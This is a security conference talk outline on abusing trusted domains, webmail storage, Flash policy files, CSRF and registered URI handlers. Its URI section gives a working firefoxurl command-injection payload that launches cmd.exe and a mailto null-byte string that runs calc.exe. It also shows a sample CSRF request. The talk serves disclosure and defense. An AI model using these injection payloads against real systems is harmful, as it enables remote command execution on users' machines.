# Biting the Hand that Feeds You: Storing and Serving Malicious Content from Popular Web Servers
**Presenters:** Billy K Rios (BK) and Nate McFeters

## Agenda
- **Domain Names and Trust**
  - Who do you Trust?
  - Biting the Hand - Yahoo
  - Biting the Hand - Gmail
  - Flash-Based Attacks
  - URI Use and Abuse
  - Questions / Conclusions

### Domain Names and Trust
#### Factors Influencing Trust
- **Browser Restrictions**
- **SSL Certificates**
- **Phishing Filters**
- **Human Trust**

### Cross-Site Request Forgery (CSRF)
#### Classic Example of CSRF
- **Scenario**: An attacker (Billy) attempts to transfer $1 to his friend's (Nate) checking account via `www.BigCreditUnion.com`.
  - **Request**:
    ```http
    GET /transfer.do?toacct=NATE&amount=1 HTTP/1.1
    Cookie: MYCOOKIE=AWSWADJ1LE3UQHJ3AJUAJ5Q5U
    Host: www.BigCreditUnion.com
    ```
  - **Outcome**: The web application successfully ties the user’s session to the appropriate account, deducting $1 from Billy’s account and adding it to Nate’s.

#### CSRF with a Twist
- **Forcing an Authenticated Session**: The attacker forces the user’s browser to establish an authenticated session with the target server.
- **Example**: Nasty JavaScript code can be used to achieve this.

### Web Mail
#### Features and Vulnerabilities
- **Storage Space**
- **Anonymity**
- **Speed**
- **Trust**

### Case Studies
#### Yahoo
- **Sign-up Process**
- **Protection Measures**
- **Storing Content on Yahoo**
- **Serving Content on Yahoo**
- **Demo**

#### Gmail
- **Sign-up Process**
- **Protection Measures**
- **Storing Content on Gmail**
- **Serving Content on Gmail**
- **Demo**

### Other Avenues of Abuse
- **Malware**
- **Warez**
- **File Sharing**
- **Covert Channels**
- **Full-Blown File Sharing Applications**

### Flash-Based Attacks
- **Flash Crossdomain Restrictions**
- **Crossdomain.xml**
- **loadPolicyFile()**
  - **Explanation**: The `System.security.loadPolicyFile()` API allows administrators with write access to a portion of a website to grant read access to that portion. By default, the policy file is located in the root directory of the target server. This API, introduced in Flash Player 7 (version 7.0.19.0), enables specifying a non-default location for the policy file.

### Defenses
- **Switching Domains (Correctly!)**
- **CSRF Protections for File Download**
- **CSRF Protection for Web-based Authentication**
- **Avoid Pwnership**
- **Rethinking WEBMAIL!**

### URI Use and Abuse
- **Registered URI Handler Abuse**
  - **Overview**: URIs are registered on your machine by developers. Common ones include `http://`, `ftp://`, etc., but there are others like `aim://`, `firefoxurl://`, `picasa://`, etc.
  - **Vulnerability**: Registered URIs can be accessed through XSS exposures, allowing interaction with commands passed to the operating system.

#### Tools and Discoveries
- **DUH (Dump URL Handlers) Tool**: Developed with help from Erik Cabetas, this tool enumerates registered URIs in the Windows Registry.

#### Vulnerable Scenarios
- **Cross-Browser Scripting**
  - **IE Pwns Firefox and NN 9**: Through the “firefoxurl” and “navigatorurl” handlers, double quotes are not properly sanitized, allowing command injection.
  - **Command Injection Example**:
    ```javascript
    firefoxurl:test"%20-chrome%20"javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
    ```

- **Cross-Application Scripting**
  - **IE Pwns Trillian**: Through the “aim” URL handler, stack overflow vulnerabilities allow arbitrary content to be written to arbitrary locations via the “ini” parameter.
  - **Demo**: Stack Overflow and Command Injection

- **Remote Command Execution in FF, NN 9, Mozilla, and other Gecko-based Browsers**
  - **Behavior**: If a `%00` is present in the URL, the URL protocol handler is bypassed, and the FileType handler is called based on the extension.
  - **Demo**:
    ```plaintext
    mailto:%00%00../../../../../windows/system32/cmd".exe ../../../../../windows/system32/calc.exe " - " blah.bat
    ```

### Blame Game
- **Responsibility**: Both browsers and application developers are at fault. Browsers should sanitize data, and developers should register URIs more securely.

### Future Directions
- **Functionality Attacks**: Potential attacks on protocols like `irc://`, `picasa://`, `xmpp://`, and *Nix systems.

### Questions and Contact
- **Questions?** Feel free to reach out at xs-sniper.com.